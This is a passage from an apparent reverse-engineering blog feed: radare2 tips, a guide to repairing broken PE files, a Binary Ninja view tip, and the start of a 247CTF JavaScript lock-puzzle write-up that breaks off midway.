&lt;li&gt;press [Enter] and [y] to save changes.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;copypaste&#34;&gt;Copy/Paste&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Enter to &lt;em&gt;visual mode&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Enable cursor mode with [c].&lt;/li&gt;
&lt;li&gt;Press [Shift] to select area to copy, ten press [y].&lt;/li&gt;
&lt;li&gt;Go to desired place and press [Y] to paste copied data.&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;code-analysis&#34;&gt;Code analysis&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Enter to &lt;em&gt;Visual mode&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Seek to piece of code for analysis&lt;/li&gt;
&lt;li&gt;Enter [d], then [f] for define function.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;references--furtker-reading&#34;&gt;References / Furtker Reading&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://monosource.gitbooks.io/radare2-explorations/content/&#34;&gt;Introduction · Radare2 Explorations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://radare.gitbooks.io/radare2book/content/&#34;&gt;Introduction · Radare2 Book&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content>
    </item>
    
    <item>
      <title>!e Fix Broken PE</title>
      <link>/posts/fix-broken-pe/</link>
      <pubDate>Sun, 18 Apr 2021 12:12:00 +0200</pubDate>
      
      <guid>/posts/fix-broken-pe/</guid>
      <description></description>
      <content>&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hasherezade/pe-bear-releases&#34;&gt;PE-Bear&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.ntcore.com/?page_id=388&#34;&gt;CFF Explorer&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://mh-nexus.de/en/hxd/&#34;&gt;HxD - hex editor&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;troubleshooting&#34;&gt;Troubleshooting&lt;/h2&gt;
&lt;h3 id=&#34;case-0-broken-headers&#34;&gt;Case 0: Broken headers&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Assumtion: you have dumped PE file with broken headers (i. e &lt;code&gt;MZ PE&lt;/code&gt; magic bytes are gone).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Open &lt;em&gt;dump.bin&lt;/em&gt; in hex editor&lt;/li&gt;
&lt;li&gt;Find reference parameter (use &lt;a href=&#34;https://github.com/corkami/pics&#34;&gt;corkami-pics&lt;/a&gt;) which is probably not overwritten:
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Machine&lt;/code&gt;, for 32bit: &lt;code&gt;4c 01&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Open good binary (for example unpacker exe) in hex editor:
&lt;ol&gt;
&lt;li&gt;Find the same reference parameter&lt;/li&gt;
&lt;li&gt;Copy all bytes before it&lt;/li&gt;
&lt;li&gt;Go back to broken binary&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Paste bytes into &lt;em&gt;dump.bin&lt;/em&gt; into all bytes before refence bytes.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#fix-misalligned-sections&#34;&gt;Re-allign sections if necessary&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;case-1-this-app-cant-run-on-your-pc&#34;&gt;CASE 1: This app can&#39;t run on your PC&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/broken-pe/image1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What it really means&lt;/strong&gt;: loader can&#39;t load it, so you also won&#39;t be able to load it into the debugger.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Resolution&lt;/strong&gt;: manual headers fixing is required&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Open file wit &lt;em&gt;PE-Bear&lt;/em&gt; or &lt;em&gt;CFF explorer&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Verify the state of binary, if it is in the mapped state (loaded into the process), then you might need to unmap it; otherwise:&lt;/li&gt;
&lt;li&gt;Review Optional Headers:
&lt;ul&gt;
&lt;li&gt;look for red markings&lt;/li&gt;
&lt;li&gt;if some address is pointing into to not existing section in &lt;em&gt;Section Headers&lt;/em&gt; → null it
&lt;img src=&#34;/img/broken-pe/image2.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Review &lt;em&gt;Section Headers&lt;/em&gt;:
&lt;ul&gt;
&lt;li&gt;if &lt;em&gt;address&lt;/em&gt; is highlighted with red color, then it means that sections are misaligned, you need to review binary in hex editor and start offset of the section manually&lt;/li&gt;
&lt;li&gt;if size is highlighted with red color, then you might need to shrink it or expand it will i.e null-pad (in hex editor)
&lt;img src=&#34;/img/broken-pe/image3.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;NOTE: Additional actions might be required!&lt;/p&gt;
&lt;p&gt;If you are modifying size of section which is between other sections, then you might need to modify RA of the next sections!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;case-2-the-application-has-failed-to-start-because-its-side-by-side-configuration-is-incorrect&#34;&gt;CASE 2: The application has failed to start because its side-by-side configuration is incorrect&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/broken-pe/image4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What it really means&lt;/strong&gt;: Configuration file required to load is malformed.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Resolution&lt;/strong&gt;: You need to replace configuration with the valid one.&lt;/p&gt;
&lt;p&gt;Some binaries are using special configuration files to load binary located in &lt;em&gt;Resources/Configuration Files/1.&lt;/em&gt; To fix this issue edit the configuration manually or paste (with i.e hex editor) the default one presented below:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Default configuration.xml&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;assembly&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;urn:schemas-microsoft-com:asm.v1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;manifestVersion=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;assemblyIdentity&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;version=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0.0.0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MyApplication.app&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;trustInfo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;urn:schemas-microsoft-com:asm.v2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;security&amp;gt;&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;requestedPrivileges&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;urn:schemas-microsoft-com:asm.v3&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;requestedExecutionLevel&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;level=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;asInvoker&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;uiAccess=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;false&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
      &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/requestedPrivileges&amp;gt;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/security&amp;gt;&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/trustInfo&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/assembly&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;case-3-programexe-has-stopped-working&#34;&gt;CASE 3: program.exe has stopped working&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;/img/broken-pe/image5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;What it really means&lt;/strong&gt;: System was able to load PE into the memory and execute it, but execution failed for some reason.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Resolution&lt;/strong&gt;: Analyze the issue with debugger and resolve it.&lt;/p&gt;
&lt;p&gt;This is very common error and might indicate:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;misaligned/missing sections;&lt;/li&gt;
&lt;li&gt;programming error, like not handled exception etc;&lt;/li&gt;
&lt;li&gt;other.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To solve it you should open the program with debugger and analyze the conditions which are creating this error. &lt;/p&gt;
&lt;h2 id=&#34;fix-misalligned-sections&#34;&gt;Fix misalligned sections&lt;/h2&gt;
&lt;p&gt;Make sure that you have binary which is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dumped,&lt;/li&gt;
&lt;li&gt;with fixed PE headers,&lt;/li&gt;
&lt;li&gt;unmapped.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;![ScreenShot 2020-01-20 at 07.34.41](/img/broken-pe/ScreenShot 2020-01-20 at 08.48.16.png)&lt;/p&gt;
&lt;h3 id=&#34;auto&#34;&gt;Auto&lt;/h3&gt;
&lt;h4 id=&#34;with-pe_unmapper&#34;&gt;With pe_unmapper&lt;/h4&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/hasherezade/libpeconv/tree/master/pe_unmapper&#34;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pe_unmapper.exe &amp;lt;in_file&amp;gt;      &amp;lt;base&amp;gt;  &amp;lt;opt: out&amp;gt;&lt;/span&gt;
&amp;gt; pe_unmapper.exe _02660000.mem 02660000 payload.dll
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;manual&#34;&gt;Manual&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Open binary in hex editor&lt;/li&gt;
&lt;li&gt;Go to the 1st section (on example above to &lt;code&gt;0x1000&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Section should start in this place, nulls should be before.&lt;/li&gt;
&lt;li&gt;Append nulls starting from last null seen before 1st section (&lt;code&gt;0xfdf&lt;/code&gt;) to section start address (inconclusive) (&lt;code&gt;0x1000&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Save.&lt;/li&gt;
&lt;li&gt;Review in &lt;em&gt;PE Bear&lt;/em&gt;:
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Sections&lt;/code&gt; &amp;gt; &lt;code&gt;Section Headers&lt;/code&gt; should no longer be marked as read.&lt;/li&gt;
&lt;li&gt;if &lt;code&gt;Section Headers &lt;/code&gt; &amp;gt; &lt;code&gt;Image Base&lt;/code&gt; is the same as dumped section address (if not, set it to dumped section address).&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&#34;/img/broken-pe/image-20200120085607174.png&#34; alt=&#34;image-20200120085607174&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/broken-pe/image-20200120090648279.png&#34; alt=&#34;image-20200120090648279&#34;&gt;&lt;/p&gt;</content>
    </item>
    
    <item>
      <title>[HINT] BinaryNinja: how to view 2 IL views at the same time</title>
      <link>/posts/protip-binary-ninja-side-view/</link>
      <pubDate>Thu, 17 Dec 2020 19:04:08 +0200</pubDate>
      
      <guid>/posts/protip-binary-ninja-side-view/</guid>
      <description>&lt;p&gt;Short blogpost about viewing 2 binary views (ghidra-like) in BinaryNinja&lt;/p&gt;</description>
      <content>&lt;p&gt;Short blogpost about viewing 2 binary views (ghidra-like) in BinaryNinja&lt;/p&gt;
&lt;p&gt;Probably not everyone is aware, but it is possible to enable Ghidra-like mode which will show 2 synchronised binary representations of the same piece if binary, so: assembly and HLIL (decompiled output).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/img/binja-refl-binview.png&#34; alt=&#34;pic&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;settings&#34;&gt;Settings&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;/img/binja-refl-settings.png&#34; alt=&#34;pic&#34;&gt;&lt;/p&gt;
&lt;p&gt;By default reflection view will sync the IL, so you shoud disable it in the settings.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;HINT:&lt;/strong&gt; Search for &amp;ldquo;reflection&amp;rdquo; in Settings to find all settings related to this feature.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;how-to-enable&#34;&gt;How to enable&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Open &lt;em&gt;View&lt;/em&gt; &amp;gt; &lt;em&gt;Native Docks&lt;/em&gt; &amp;gt; &lt;em&gt;Show Reflection&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Take this window and snap it into convinient for you location&lt;/li&gt;
&lt;li&gt;Change the active IL view by selecting it in the list in the upper-right corner or by pressing &lt;code&gt;I&lt;/code&gt; on keyboard.&lt;/li&gt;
&lt;/ol&gt;</content>
    </item>
    
    <item>
      <title>247CTF - The Secret Lock Writeup</title>
      <link>/posts/247ctf-the-secret-lock/</link>
      <pubDate>Sun, 02 Aug 2020 12:32:42 +0200</pubDate>
      
      <guid>/posts/247ctf-the-secret-lock/</guid>
      <description></description>
      <content>&lt;h2 id=&#34;about-247ctf1&#34;&gt;About &lt;a href=&#34;https://247ctf.com/&#34;&gt;247CTF&lt;/a&gt;&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;The 247/CTF is a security Capture The Flag (CTF) learning environment. The platform contains a number of hacking challenges where you can test your skills across web, cryptography, networking, reversing and exploitation by solving problems to recover flags.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Or generally saying it is the platform which hosts CTF challs for whole year :)&lt;/p&gt;
&lt;h2 id=&#34;task---the-secret-lock&#34;&gt;Task - The Secret Lock&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Can you reverse the secret combination to open the lock and recover the flag?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The single HTML page is given with digital lock:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;it have 40 fields&lt;/li&gt;
&lt;li&gt;each field have 501 available values (0-500)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;/img/.247ctf-the-secret-lock.assets/secret-lock.png&#34; alt=&#34;Lock&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
&lt;p&gt;By looking into the code we can quickly identify the code section, because it is written in plain-text in the single &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; block. Below you can see the main unlocking logic:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;onChange&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getCode&lt;/span&gt;();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;checkFlag&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dom&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;status&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;textContent&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;;
}

&lt;span style=&#34;color:#a6e22e&#34;&gt;getCode&lt;/span&gt;() {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {};
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;len&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dom&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;rows&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;len&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dom&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;rows&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;querySelector&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.is-selected .text&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;textContent&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;;
}

&lt;span style=&#34;color:#a6e22e&#34;&gt;checkFlag&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LOCKED&amp;#34;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dom&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;lock&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;classList&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;remove&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;verified&amp;#39;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (Object.&lt;span style=&#34;color:#a6e22e&#34;&gt;keys&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; ((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;/* stripped for readibillity */&lt;/span&gt;)) {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;idx&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;idx&lt;/span&gt;]));
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dom&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;lock&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;classList&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;verified&amp;#39;&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;result&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here is the unlocking summary:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;On each digit change the &lt;code&gt;onChange()&lt;/code&gt; function is called.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;getCode()&lt;/code&gt; is run, it returns the integer value.&lt;/li&gt;
&lt;li&gt;Code is checked in &lt;code&gt;checkFlag()&lt;/code&gt; which runs a lot of algebraic expressions (120 to be precise). I stripped them to improve the readibillity.&lt;/li&gt;
&lt;li&gt;If all checks are passed, then each value is treated as ascii character and it&amp;rsquo;s passed to &lt;em&gt;result&lt;/em&gt; value.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Like I mentioned before - we have big block of conditions which needs to be met, you can find short snippet below (I used visual-code to quickly get rid of &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt; operators and put each expression in new line).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) 
((&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;flag&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;234&lt;/span&gt;) 
